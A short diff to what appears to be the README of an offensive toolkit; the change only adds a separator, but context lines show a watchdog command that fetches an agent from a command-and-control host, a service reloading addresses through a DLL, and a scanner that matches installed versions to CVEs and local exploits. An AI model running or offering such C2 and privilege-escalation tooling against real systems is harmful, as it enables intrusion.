@@ -256,6 +256,10 @@ watchdog.exe <agent.exe> <https://c2.server/agent.exe>
    ```
 3. The running service will pick up the new addresses on its next DLL reload cycle.
 
+
+---
+
+
 # Scanner
 
 Console tool that, reads a local SQLite CVE DB. Checks kernel and specified package versions.Prints matching CVEs and local exploits from a CSV.
